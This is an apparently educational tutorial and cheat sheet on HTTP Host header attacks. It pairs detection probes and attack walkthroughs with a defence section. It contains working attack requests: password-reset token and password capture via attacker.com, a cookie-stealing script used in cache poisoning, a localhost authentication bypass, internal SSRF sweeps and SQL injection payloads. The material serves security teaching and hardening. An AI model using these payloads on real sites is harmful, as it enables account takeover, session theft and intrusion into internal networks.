# HTTP Host Header Attacks

## Table of Contents

1. [What is the HTTP Host Header?](#1-what-is-the-http-host-header)
2. [How the Host Header Works](#2-how-the-host-header-works)
3. [Why Host Header Vulnerabilities Exist](#3-why-host-header-vulnerabilities-exist)
4. [Where It Occurs — Attack Surface](#4-where-it-occurs--attack-surface)
5. [Detection — Finding the Entry Point](#5-detection--finding-the-entry-point)
   - 5.1 [Supply an Arbitrary Host Header](#51-supply-an-arbitrary-host-header)
   - 5.2 [Check for Flawed Validation](#52-check-for-flawed-validation)
   - 5.3 [Inject Duplicate Host Headers](#53-inject-duplicate-host-headers)
   - 5.4 [Supply an Absolute URL in Request Line](#54-supply-an-absolute-url-in-request-line)
   - 5.5 [Add Line Wrapping (Header Indentation)](#55-add-line-wrapping-header-indentation)
   - 5.6 [Inject Host Override Headers](#56-inject-host-override-headers)
6. [Attack Techniques](#6-attack-techniques)
   - 6.1 [Password Reset Poisoning](#61-password-reset-poisoning)
   - 6.2 [Password Reset Poisoning via Dangling Markup](#62-password-reset-poisoning-via-dangling-markup)
   - 6.3 [Web Cache Poisoning via Host Header](#63-web-cache-poisoning-via-host-header)
   - 6.4 [Authentication Bypass via Host Header](#64-authentication-bypass-via-host-header)
   - 6.5 [Internal Virtual Host Brute-Forcing](#65-internal-virtual-host-brute-forcing)
   - 6.6 [Routing-Based SSRF](#66-routing-based-ssrf)
   - 6.7 [SSRF via Flawed Request Parsing (Absolute URL)](#67-ssrf-via-flawed-request-parsing-absolute-url)
   - 6.8 [Connection State Attack](#68-connection-state-attack)
   - 6.9 [SSRF via Malformed Request Line (@-prefix)](#69-ssrf-via-malformed-request-line--prefix)
   - 6.10 [Classic Server-Side Injection via Host Header](#610-classic-server-side-injection-via-host-header)
7. [Impact Assessment](#7-impact-assessment)
8. [Defense & Prevention](#8-defense--prevention)
9. [Quick Reference Cheat Sheet](#9-quick-reference-cheat-sheet)

---

## 1. What is the HTTP Host Header?

The HTTP `Host` header is a **mandatory** request header introduced in HTTP/1.1. It specifies the domain name the client wants to communicate with, allowing a single server or intermediary to distinguish between multiple applications sharing the same IP address.

```http
GET /web-security HTTP/1.1
Host: portswigger.net
```

### Key Insight

- The `Host` header is **user-controllable** — any proxy, interceptor, or raw HTTP client can set it to any value
- Applications that trust the Host header without validation use it to construct URLs, make routing decisions, and generate links — all of which can be poisoned
- Vulnerabilities often arise not from application code but from **misconfigured infrastructure** — load balancers, reverse proxies, CDNs — that blindly forward or act on the header value
- The Host header is a vector for: web cache poisoning, password reset poisoning, SSRF, auth bypass, and classic injection attacks

---

## 2. How the Host Header Works

### Two Scenarios That Require the Host Header

**Scenario 1 — Virtual Hosting:**

One physical server hosts multiple websites. All share the same IP. The server uses the Host header to determine which site's content to serve.

```
Client Request: Host: siteA.com
Server: routes to /var/www/siteA/

Client Request: Host: siteB.com
Server: routes to /var/www/siteB/
```

**Scenario 2 — Reverse Proxy / Load Balancer:**

Multiple backend servers sit behind a single intermediary. All domain names resolve to the intermediary's IP. The intermediary uses the Host header to route to the correct backend.

```
DNS:  siteA.com → 203.0.113.1 (load balancer)
DNS:  siteB.com → 203.0.113.1 (load balancer)

Load balancer reads Host: siteA.com → forwards to 10.0.0.1:8080
Load balancer reads Host: siteB.com → forwards to 10.0.0.2:8080
```

### Full Request Flow

```
Browser
  │  Host: example.com
  ▼
CDN / Load Balancer / Reverse Proxy
  │  reads Host → routes to correct backend
  │  may inject X-Forwarded-Host with original value
  ▼
Backend Application Server
  │  reads Host (or X-Forwarded-Host)
  │  uses it to generate links, reset URLs, cache keys
  ▼
Response returned to client
```

### Where the Vulnerability Is Born

Applications that dynamically construct URLs using the Host header:

```php
// Vulnerable — trusts Host header blindly
$reset_url = "https://" . $_SERVER['HTTP_HOST'] . "/reset?token=" . $token;
mail($user_email, "Reset your password", "Click here: " . $reset_url);
```

If the Host header is attacker-controlled and the application doesn't validate it, the attacker controls the destination embedded in the password reset email.

---

## 3. Why Host Header Vulnerabilities Exist

| Root Cause | Explanation |
|------------|-------------|
| Implicit trust | Developers assume the Host header contains the real domain — it doesn't; it's user-controlled |
| Flawed routing logic | Different components (front-end vs back-end) parse the Host header differently, creating exploitable discrepancies |
| Override headers | Headers like `X-Forwarded-Host` are trusted by back-ends because they're assumed to come from trusted intermediaries — but they too are user-controllable |
| Third-party defaults | Framework or middleware components support override headers by default without the developer knowing |
| Validation gaps | Validation exists on the Host header but not on override headers, or applies to one system but not another in the chain |

---

## 4. Where It Occurs — Attack Surface

| Location | Example | Notes |
|----------|---------|-------|
| Password reset functionality | Reset link URL generated from `Host` header | Attacker poisons the link to redirect token to their server |
| Absolute URL generation | `<a href="https://HOST/path">` built server-side | Reflected/stored in response — cache poisoning vector |
| Script/resource imports | `<script src="https://HOST/js/app.js">` | Host value in src → redirect to attacker-controlled JS |
| Routing logic in load balancers | LB forwards based on unvalidated Host | Routing-based SSRF to internal systems |
| Access control decisions | `if Host == 'localhost' → grant admin access` | Bypass authentication entirely |
| SQL queries using Host value | `WHERE domain = '$_SERVER["HTTP_HOST"]'` | SQL injection via Host header |
| Cache key construction | Integrated caches may exclude Host from cache key | Serve poisoned cached response to all users |
| Email generation | Email links built from Host header | Dangling markup, credential theft via HTML injection |

---

## 5. Detection — Finding the Entry Point

### 5.1 Supply an Arbitrary Host Header

The first probe — change the Host header to a random domain and observe:

```http
GET / HTTP/1.1
Host: arbitrary-hostname-12345.com
```

**Positive indicators:**
- Request still returns `200` with application content → Host is not strictly validated → proceed to exploitation
- Response reflects the injected hostname → direct injection confirmed

**Negative indicators:**
- `Invalid Host header` error → strict validation present; try bypass techniques
- Request never reaches the application (CDN rejects it) → use override headers instead

### 5.2 Check for Flawed Validation

When basic injection is blocked, probe the validation logic for loopholes:

**Inject payload via non-numeric port (validator strips port, executes payload):**
```http
GET / HTTP/1.1
Host: legitimate-site.com:bad-stuff-here
```

**Suffix match bypass (register domain ending in whitelisted string):**
```http
GET / HTTP/1.1
Host: evilnotlegitimate-site.com
```
If the validator checks `if host.endswith('legitimate-site.com')` → passes.

**Compromised subdomain bypass:**
```http
GET / HTTP/1.1
Host: hacked-subdomain.legitimate-site.com
```
If the validator checks `if host.contains('legitimate-site.com')` → passes.

### 5.3 Inject Duplicate Host Headers

Different components in a request chain may give precedence to different Host header instances:

```http
GET / HTTP/1.1
Host: legitimate-site.com
Host: evil-host.com
```

**What happens:**
- Front-end reads the **first** Host → validates as legitimate → routes correctly
- Back-end reads the **last** Host → uses `evil-host.com` in URL generation

**Variation — line wrapping (indented header treated as folded value):**
```http
GET / HTTP/1.1
    Host: evil-host.com
Host: legitimate-site.com
```
- Systems that follow obsolete header folding RFC see one combined header
- Systems that don't see two separate headers, each giving precedence to different one

### 5.4 Supply an Absolute URL in Request Line

When the Host header itself is strictly validated, supply an absolute URL — some servers prefer the request line over the Host header for routing, while the application still reads the Host header:

```http
GET https://legitimate-site.com/ HTTP/1.1
Host: evil-host.com
```

**What happens:**
- Reverse proxy routes based on the absolute URL → forwards to correct backend
- Backend application reads `Host` header → uses `evil-host.com` in generated content

**Also try protocol switching:**
```http
GET http://legitimate-site.com/ HTTP/1.1
Host: evil-host.com
```
Some servers behave differently depending on whether the absolute URL uses HTTP or HTTPS.

### 5.5 Add Line Wrapping (Header Indentation)

```http
GET / HTTP/1.1
 Host: evil-host.com
Host: legitimate-site.com
```

The leading space before the second-line `Host` causes some servers to treat it as a continuation of the previous header (folded value) and others to ignore it. This inconsistency between systems creates exploitable discrepancies.

### 5.6 Inject Host Override Headers

When the Host header itself can't be tampered with, inject via headers that override it:

```http
GET / HTTP/1.1
Host: legitimate-site.com
X-Forwarded-Host: evil-host.com
```

These headers exist for legitimate use (proxy chains need to communicate the original client-facing hostname to the backend). Many frameworks consume them by default — they replace the Host header value in the application context without the developer realizing it.

**Full list of override headers to try:**

| Header | Notes |
|--------|-------|
| `X-Forwarded-Host` | De-facto standard; most widely supported |
| `X-Host` | Variant used by some frameworks |
| `X-Forwarded-Server` | Used by some proxies |
| `X-HTTP-Host-Override` | Google-specific but seen elsewhere |
| `Forwarded` | RFC 7239 standard; `Forwarded: host=evil-host.com` |

> **Attacker note:** Try all override headers — even when the application appears to validate the Host header correctly. Many frameworks have `X-Forwarded-Host` support baked in at the middleware level, invisible to the developer. A single successful override confirmation unlocks every Host-header attack chain.

---

## 6. Attack Techniques

### 6.1 Password Reset Poisoning

**Situation:** The application generates a password reset link using the Host header value. The link is emailed to the user. The attacker controls which domain the token is sent to.

**Normal flow:**
```
POST /forgot-password
username=victim

Server generates: https://legitimate-site.com/reset?token=abc123
Emails link to victim → victim clicks → resets password
```

**Attack — inject attacker-controlled Host:**
```http
POST /forgot-password HTTP/1.1
Host: attacker.com
Content-Type: application/x-www-form-urlencoded

username=carlos
```

**What happens:**
```
Server reads Host: attacker.com
Server generates: https://attacker.com/reset?token=abc123
Server emails this URL to carlos
Carlos (or spam filters, email crawlers, log systems) requests: https://attacker.com/reset?token=abc123
Attacker reads server access logs → retrieves token abc123
Attacker visits: https://legitimate-site.com/reset?token=abc123
Attacker resets carlos's password → account takeover
```

**Why it works:** The application trusts the Host header to represent the current domain without validating it. The reset token — a single-use credential — is embedded in a URL whose domain the attacker fully controls.

**Token capture mechanisms:**
- Attacker's server receives GET request containing the token in the URL path/params
- If victim's email client prefetches URLs (link preview), the token is captured automatically without victim action
- Corporate email gateways, security scanners, and antivirus systems follow links — also capture the token

> **Attacker note:** This attack works even if the victim never clicks the link. Many email security systems automatically follow links to check for malware — they deliver the reset token straight to the attacker's access log. You don't need the victim's interaction at all.

---

### 6.2 Password Reset Poisoning via Dangling Markup

**Situation:** The Host header is validated against its domain but allows arbitrary ports. The port value is reflected unescaped inside an HTML email. The new password is sent in the same email body below the reflected content.

**Attack — inject dangling markup via port:**
```http
POST /forgot-password HTTP/1.1
Host: legitimate-site.com:'<a href="//attacker.com/?
Content-Type: application/x-www-form-urlencoded

username=carlos
```

**What the email HTML looks like after injection:**
```html
<a href="https://legitimate-site.com:'<a href="//attacker.com/?/login">Reset</a>
...
Your new password is: SuperSecret123
```

**What happens:**
```
The injected <a href="//attacker.com/? opens a new tag
The rest of the email content — including the new password — becomes
the query string of the attacker's URL
When the email client renders HTML (or prefetches links):
GET /?/login'>...Your new password is: SuperSecret123  HTTP/1.1
Host: attacker.com
→ Attacker reads password from server access log
```

**Why it works:** The port component of the Host header bypasses domain validation. The port value is reflected as-is inside a link attribute without HTML encoding. Injecting an unclosed `<a href="//attacker.com/?` tag causes the parser to treat the remaining email content as part of the URL query string — including the cleartext password sent below.

> **Attacker note:** This technique bypasses `DOMPurify` and similar client-side sanitizers because the injection happens in raw email HTML, not in a browser context. Always check the raw HTML version of emails — rendered views may sanitize content that raw HTML does not.

---

### 6.3 Web Cache Poisoning via Host Header

**Situation:** The application reflects the Host header value in the response (e.g., in a script `src` attribute or absolute URL). A cache sits in front of the application. The cache key does not include the Host header (or includes a secondary Host header that the cache ignores).

**Normal response:**
```html
<script src="https://legitimate-site.com/resources/js/tracking.js"></script>
```

**Attack — inject second Host header with exploit server:**
```http
GET /?cb=123 HTTP/1.1
Host: legitimate-site.com
Host: attacker.com
```

**Poisoned response (reflected in script src):**
```html
<script src="https://attacker.com/resources/js/tracking.js"></script>
```

**Attack chain:**
```
1. Create malicious JS file on attacker server at /resources/js/tracking.js
   Content: document.location='https://attacker.com/?c='+document.cookie

2. Send poisoned request until cache stores the response:
   GET /?  HTTP/1.1
   Host: legitimate-site.com
   Host: attacker.com

3. Cache stores response with attacker.com in script src

4. Every subsequent visitor to the page receives the poisoned response
   → Their browser loads attacker's JS → XSS / session theft
```

**Why it works:** The cache key is built from the first Host header (legitimate domain) — it matches subsequent user requests. The second Host header is ignored by the cache but consumed by the backend, which reflects it in the response. The cache stores the poisoned response and serves it to all users requesting the legitimate URL.

**Cache key mechanics:**
```
Cache key:  GET / + Host: legitimate-site.com  ← matches all users
Stored response contains:  src="https://attacker.com/..."  ← poisoned
```

> **Attacker note:** Use a cache buster (`?cb=random`) while developing the payload to avoid caching your intermediate attempts. Only remove the buster when you're ready to poison the actual cache key used by real users. Integrated application-level caches are the primary target — standalone CDN caches often include the full Host header in the cache key, making this harder.

---

### 6.4 Authentication Bypass via Host Header

**Situation:** The application grants elevated access (e.g., admin panel) to requests that originate from `localhost` or an internal IP, based on the assumption that only the server itself can send such requests. The access check reads the Host header.

**Blocked request:**
```http
GET /admin HTTP/1.1
Host: legitimate-site.com
→ 403 Forbidden: Admin panel accessible to local users only
```

**Attack — spoof localhost via Host header:**
```http
GET /admin HTTP/1.1
Host: localhost
→ 200 OK — full admin panel returned
```

**Follow-up — perform admin actions:**
```http
GET /admin/delete?username=carlos HTTP/1.1
Host: localhost
→ User deleted
```

**Why it works:** The access control logic checks `if (Host == 'localhost') → grant admin access` under the assumption that this condition can only be true for local processes. It doesn't account for external clients setting the Host header to any arbitrary value.

> **Attacker note:** Also try `Host: 127.0.0.1`, `Host: 0.0.0.0`, `Host: [::1]` (IPv6 loopback), and `Host: internal.example.com`. Different applications check different values. Always read the error message on the initial 403 — it often states exactly which host is trusted, giving you the precise value to inject.

---

### 6.5 Internal Virtual Host Brute-Forcing

**Situation:** Internal-only websites are hosted as virtual hosts on the same server as public-facing content. They have no public DNS records but respond to the correct Host header value.

**Known infrastructure from DNS:**
```
www.example.com:       12.34.56.78  (public)
intranet.example.com:  10.0.0.132   (internal, no public DNS)
```

**Attack — brute force Host header with subdomain wordlist:**
```http
GET / HTTP/1.1
Host: admin.example.com
→ 302 Found (exists!)

GET / HTTP/1.1
Host: staging.example.com
→ 404 Not Found

GET / HTTP/1.1
Host: internal.example.com
→ 200 OK — internal portal
```

**Wordlist approach:**

Use a subdomain wordlist against the target IP, iterating through candidate hostnames. A `200` or `302` response (vs `400`/`404`) indicates a live virtual host.

```bash
# Manual curl approach
while read sub; do
  code=$(curl -s -o /dev/null -w "%{http_code}" -H "Host: $sub.example.com" http://<TARGET_IP>/)
  echo "$code $sub.example.com"
done < subdomains.txt | grep -v "^400\|^404"
```

> **Attacker note:** Information disclosure vulnerabilities — error messages, comments in source, WHOIS records, old DNS entries in CT logs — frequently reveal internal hostnames before brute-forcing is needed. Always check those first. The brute-force approach generates significant requests and may trigger rate limiting.

---

### 6.6 Routing-Based SSRF

**Situation:** A load balancer or reverse proxy routes requests based on the Host header without validation. An attacker can manipulate the Host header to make the intermediary forward the request to an arbitrary internal server — including non-HTTP-accessible systems.

**Architecture:**
```
Internet → Load Balancer (public IP) → Backend servers (private IPs 192.168.0.x)

Load balancer routes: Host: example.com → 192.168.0.5
```

**Attack — redirect routing to internal IP:**
```http
GET / HTTP/1.1
Host: 192.168.0.68
```

**Load balancer behavior:**
```
Reads Host: 192.168.0.68
Routes request to 192.168.0.68 (internal)
Internal admin server at 192.168.0.68 responds with admin panel
→ Response returned to attacker
```

**Internal network scanning — iterate last octet:**
```http
GET / HTTP/1.1
Host: 192.168.0.§0§

Payloads: 0–255
Filter: responses with status 302 or 200 (vs timeouts/connection refused)
```

**OAST confirmation (before scanning):**
```http
GET / HTTP/1.1
Host: your-oast-server.com
→ DNS/HTTP callback received → confirms the LB makes outbound requests based on Host
```

**Admin panel exploitation after discovery:**
```http
GET /admin HTTP/1.1
Host: 192.168.0.68

POST /admin/delete HTTP/1.1
Host: 192.168.0.68
Cookie: session=<captured-session>
Content-Type: application/x-www-form-urlencoded

csrf=<captured-csrf>&username=carlos
```

**Why it works:** The load balancer is designed to route traffic based on the Host header. It has no concept of "this is the real internet-facing domain" — it simply forwards to whatever the header says. Internal services behind the LB are reachable by making the LB do the forwarding.

> **Attacker note:** This attack is fundamentally different from classic SSRF. There is no SSRF vulnerability in the application code — the vulnerability is in the infrastructure. The load balancer itself is the pivot point. After identifying an internal IP via `302` redirect response, always read the `Location` header — it often contains the internal hostname and reveals further structure.

---

### 6.7 SSRF via Flawed Request Parsing (Absolute URL)

**Situation:** The application validates the Host header and blocks manipulation. However, the reverse proxy also understands absolute URLs in the request line and prefers them over the Host header for routing. The application still uses the Host header for internal logic.

**Discovery:**
```http
# Normal request — Host header validated strictly
GET / HTTP/1.1
Host: evil.com
→ 400 Bad Request

# Absolute URL in request line — Host header now ignored for routing
GET https://legitimate-site.com/ HTTP/1.1
Host: evil.com
→ Timeout (no longer blocked — Host validation skipped)
```

**OAST confirmation:**
```http
GET https://legitimate-site.com/ HTTP/1.1
Host: your-oast-server.com
→ DNS/HTTP callback received → SSRF via Host header confirmed despite URL validation
```

**Internal network scan using absolute URL + Host sweep:**
```http
GET https://legitimate-site.com/ HTTP/1.1
Host: 192.168.0.§1§
→ Iterate 1–254 → find 302 response → internal admin discovered
```

**Admin panel access:**
```http
GET https://legitimate-site.com/admin HTTP/1.1
Host: 192.168.0.68
→ Admin panel returned

POST https://legitimate-site.com/admin/delete HTTP/1.1
Host: 192.168.0.68
Cookie: session=<captured>
csrf=<captured>&username=carlos
```

**Why it works:** The reverse proxy uses the absolute URL for routing (sends to `legitimate-site.com`'s backend), bypassing any IP/domain restrictions. But the backend receives the Host header as-is and uses it to construct URLs or make internal routing decisions — providing the SSRF pivot even though the primary routing is handled by the request line.

---

### 6.8 Connection State Attack

**Situation:** An HTTP server (or proxy) validates the Host header only on the **first** request of a persistent (keep-alive) connection. It assumes all subsequent requests on the same connection share the same intended host.

**Attack sequence — two requests over one connection:**

**Request 1 (legitimate — passes validation):**
```http
GET / HTTP/1.1
Host: legitimate-site.com
Connection: keep-alive
```

**Request 2 (malicious — sent over same connection, bypasses validation):**
```http
GET /admin HTTP/1.1
Host: 192.168.0.1
```

**Full sequence:**
```
Connection opened → Request 1 validated (legitimate host) → Response 1
                 → Request 2 NOT re-validated (same connection assumed safe)
                 → Request 2 routed to 192.168.0.1/admin → Admin panel returned
```

**Admin action via connection state:**
```http
POST /admin/delete HTTP/1.1
Host: 192.168.0.1
Cookie: _lab=<lab-cookie>; session=<session-cookie>
Content-Type: application/x-www-form-urlencoded
Content-Length: <correct>

csrf=<captured-csrf>&username=carlos
```
*(Sent as the second request in the same keep-alive connection)*

**Why it works:** The first request establishes trust for the connection. The server's validation logic runs once per connection rather than once per request. The second request inherits the trusted connection state and bypasses all Host header validation — routing and access decisions are made for `192.168.0.1` without challenge.

> **Attacker note:** This attack requires sending two requests over a single persistent connection in sequence. Use a client or tool that supports keep-alive and allows sending grouped requests over a shared connection. The key is that the first request must be completely legitimate — it exists only to establish the trusted connection state.

---

### 6.9 SSRF via Malformed Request Line (@-prefix)

**Situation:** A custom reverse proxy constructs the upstream URL by prepending `http://backend-server` to the request path. It does not properly validate the path format.

**Normal request construction:**
```
GET /path HTTP/1.1  →  proxy builds: http://backend-server/path  → routes correctly
```

**Malformed path with @ prefix:**
```http
GET @private-intranet/example HTTP/1.1
Host: legitimate-site.com
```

**Proxy constructs:**
```
http://backend-server@private-intranet/example
```

**How HTTP libraries parse this URL:**
```
Scheme:   http
Username: backend-server   ← treated as HTTP basic auth username
Host:     private-intranet ← the actual destination
Path:     /example

→ Request sent to private-intranet with backend-server as credentials
```

**Why it works:** The `@` character in a URL separates userinfo (credentials) from the host. The proxy doesn't validate that the path starts with `/`. HTTP client libraries treat everything before `@` as credentials and everything after as the actual host — causing the request to be delivered to an internal hostname the attacker controls via path manipulation.

> **Attacker note:** This technique specifically targets custom or poorly implemented proxy middleware. It is less common than Host header injection but devastatingly effective against home-built routing layers. Look for it in applications with unusual URL routing behavior or custom API gateway implementations.

---

### 6.10 Classic Server-Side Injection via Host Header

**Situation:** The Host header value is passed directly into a SQL query, OS command, template rendering, or other dangerous function without sanitization.

**SQL injection probe via Host header:**
```http
GET / HTTP/1.1
Host: legitimate-site.com'
→ SQL syntax error in response → Host is being embedded in SQL query
```

**Exploitation:**
```http
GET / HTTP/1.1
Host: legitimate-site.com' AND 1=1--
Host: legitimate-site.com' UNION SELECT username,password FROM users--
```

**The Host header is a valid injection vector for:**
- SQL injection (if Host used in DB query for multi-tenant routing)
- XSS (if Host reflected in response without encoding)
- SSTI (if Host passed into template engine)
- Header injection / CRLF injection (if Host used in HTTP response construction)

> **Attacker note:** Most SQLi scanners don't test the Host header — it's often missed in automated assessments. Always manually probe the Host header with standard injection characters (`'`, `"`, `<`, `>`, `;`, `\n`) and observe response differences. Multi-tenant SaaS applications are particularly likely to use the Host header for database routing.

---

## 7. Impact Assessment

| Factor | Lower Severity | Higher Severity |
|--------|---------------|-----------------|
| Injection reflected client-side only | Non-exploitable (no way to force victim's browser to send fake Host) | Cached — stored and served to all users |
| Password reset target | Own account only | Any user account → account takeover at scale |
| SSRF scope | Public internet only | Internal network, cloud metadata, admin interfaces |
| Internal service authentication | Required | None (internal services trust internal source) |
| Admin panel access | Read-only | Full admin — user deletion, config modification |
| SQL injection via Host | Error-based, limited data | Full DB dump, authentication bypass |
| Cache poisoning payload | Self-XSS | Wormable stored XSS served to all site visitors |
| Connection state attack | Single endpoint bypass | Full internal network pivot via persistent connection |

### Full Compromise Chain — Worst Case

```
Step 1: Discover Host header reflects in password reset emails
Step 2: Inject attacker domain as Host for victim's reset request
Step 3: Capture reset token from attacker server access log
Step 4: Use token to reset victim admin account password
Step 5: Log in as admin
Step 6: From admin panel, identify internal management endpoints
Step 7: Use routing-based SSRF to reach internal infrastructure
Step 8: Access cloud metadata → steal IAM credentials
Step 9: Full cloud account compromise
```

---

## 8. Defense & Prevention

### Core Principle

**Never use the Host header as a trusted source of the current domain.** Explicitly configure the canonical domain in application settings and use that value — not a runtime header — wherever an absolute URL is needed.

### 1. Avoid the Host Header Entirely for URL Generation

Use relative URLs wherever possible. A relative URL requires no domain knowledge and eliminates the entire class of password reset poisoning and cache poisoning from Host header injection.

```python
# VULNERABLE — builds URL from Host header
reset_url = f"https://{request.headers['Host']}/reset?token={token}"

# SAFE — hardcoded domain from configuration
SITE_URL = config.get('CANONICAL_URL')  # e.g. "https://example.com"
reset_url = f"{SITE_URL}/reset?token={token}"
```

### 2. Whitelist Permitted Host Values

Validate the Host header against a strict allowlist on every request. Reject or redirect anything not in the list.

```python
ALLOWED_HOSTS = ['example.com', 'www.example.com']

def validate_host(request):
    host = request.headers.get('Host', '').split(':')[0]  # strip port
    if host not in ALLOWED_HOSTS:
        raise PermissionError(f"Invalid Host header: {host}")
```

**Django framework:**
```python
# settings.py
ALLOWED_HOSTS = ['example.com', 'www.example.com']
# Django automatically validates Host against this list
```

**Limitation:** Allowlist validation only protects if applied consistently. If override headers (`X-Forwarded-Host`) are consumed by the framework before allowlist validation runs, the allowlist is bypassed.

### 3. Disable Host Override Headers

Explicitly disable support for `X-Forwarded-Host` and related headers unless your infrastructure requires them. If they are required, validate their values against the same allowlist as the Host header.

```nginx
# Nginx — strip override headers before passing to application
proxy_set_header X-Forwarded-Host "";
proxy_set_header X-Host "";
proxy_set_header X-Forwarded-Server "";
```

```apache
# Apache — remove untrusted headers
RequestHeader unset X-Forwarded-Host
RequestHeader unset X-HTTP-Host-Override
```

### 4. Configure Load Balancers to Whitelist Permitted Backends

Prevent routing-based SSRF by restricting the load balancer to only forward requests to known, permitted backends — never to arbitrary IPs from the Host header.

```
# HAProxy — only forward to defined backends
backend web_servers
    server web1 10.0.0.1:8080
    server web2 10.0.0.2:8080
# Requests with Host values not matching defined ACLs are rejected at the LB
```

### 5. Separate Internal and External Virtual Hosts

Never co-host public-facing applications and internal-only systems on the same server. An attacker who can set an arbitrary Host header can reach any virtual host on the server.

```
# DANGEROUS — same server
VirtualHost: example.com → /var/www/public
VirtualHost: admin.internal → /var/www/admin  ← accessible via Host header manipulation

# SAFE — separate servers
Public server:   example.com
Internal server: admin.internal (no public route; unreachable from internet)
```

### 6. Validate Host Header on Every Request (Not Per-Connection)

For HTTP/1.1 persistent connections, re-validate the Host header on every request — not just the first.

```python
# VULNERABLE — only validates on new connection
if connection.is_new:
    validate_host(request.host)

# SAFE — validates every request regardless of connection state
def handle_request(request):
    validate_host(request.headers['Host'])
    # proceed with request handling
```

### Defense-in-Depth Pipeline

```
Incoming Request
      │
      ▼
Strip override headers (X-Forwarded-Host, X-Host, etc.) at reverse proxy
      │
      ▼
Validate Host against allowlist → reject if not in list
      │
      ▼
Application uses hardcoded CANONICAL_URL (not Host header) for URL generation
      │
      ▼
Load balancer routes only to whitelisted backend IPs
      │
      ▼
Internal services on separate network segment — no virtual host co-location
```

---

## 9. Quick Reference Cheat Sheet

### Signs a Target May Be Vulnerable

- Password reset emails contain the full domain in the link (not a hardcoded value)
- The Host header value appears reflected anywhere in the response (links, script src, form actions)
- Multiple applications hosted at the same IP address (virtual hosting or reverse proxy)
- Cloud infrastructure with load balancers/CDNs in front of the application
- Admin panel access error message mentions "local users" or a specific hostname
- Application returns different responses based on Host header changes
- Override headers (`X-Forwarded-Host`) produce different behavior than the Host header

### Detection Probe Progression (Try in Order)

```
1. Arbitrary Host:
   Host: arbitrary123.com
   → Does the request still succeed?

2. Host reflected in response?
   → Does arbitrary123.com appear anywhere in the response body?

3. Duplicate Host headers:
   Host: legitimate.com
   Host: evil.com
   → Does evil.com appear in response?

4. Override header:
   Host: legitimate.com
   X-Forwarded-Host: evil.com
   → Does evil.com appear in response?

5. Port injection (validation bypass):
   Host: legitimate.com:bad-stuff
   → Does bad-stuff appear in response?

6. Absolute URL + modified Host:
   GET https://legitimate.com/ HTTP/1.1
   Host: evil.com
   → Timeout (not blocked)? → routing-based SSRF likely

7. OAST probe (routing-based SSRF):
   Host: your-oast-server.com
   → DNS/HTTP callback → confirmed routing-based SSRF

8. Internal IP sweep (after SSRF confirmed):
   Host: 192.168.0.§1§  (1–254)
   → 302 response → internal admin found
```

### Override Headers Reference

| Header | When to Use |
|--------|------------|
| `X-Forwarded-Host` | Primary override; try first |
| `X-Host` | Alternative; some frameworks prefer this |
| `X-Forwarded-Server` | Some proxy configurations |
| `X-HTTP-Host-Override` | Specific Google/GCP infrastructure |
| `Forwarded: host=evil.com` | RFC 7239 standard format |

### Attack Type → Precondition → Impact

| Attack | Precondition | Impact |
|--------|-------------|--------|
| Password reset poisoning | App generates reset URL from Host | Account takeover for any user |
| Dangling markup reset poisoning | Port reflected unescaped in HTML email | Credential capture without victim interaction |
| Web cache poisoning | Host reflected in response + integrated cache | Stored XSS / malicious resource load for all users |
| Auth bypass | Access control reads Host header | Admin panel access without credentials |
| Internal vhost brute force | Co-hosted public + internal sites | Access to internal applications |
| Routing-based SSRF | LB routes based on unvalidated Host | Full internal network access |
| Absolute URL SSRF | Host validated but absolute URL bypasses | SSRF despite Host header protection |
| Connection state attack | Host validated only on first request | Bypass auth/routing on subsequent requests |
| @-prefix request line SSRF | Custom proxy builds upstream URL from path | Route to arbitrary internal host |
| SQLi via Host | Host embedded in SQL query | Database exfiltration / auth bypass |

### Ambiguous Request Techniques Summary

| Technique | Request Structure | What Gets Confused |
|-----------|------------------|-------------------|
| Duplicate Host headers | Two `Host:` lines | Front-end reads first, back-end reads last |
| Absolute URL + Host | `GET https://target/ HTTP/1.1` + `Host: evil` | Proxy routes on URL, app uses Host |
| Indented/wrapped Host | Leading space before second Host | Some servers fold, others ignore |
| Port-based injection | `Host: target.com:payload` | Validator strips port, payload still processed |
| Override header | `X-Forwarded-Host: evil.com` | Host validated, override not validated |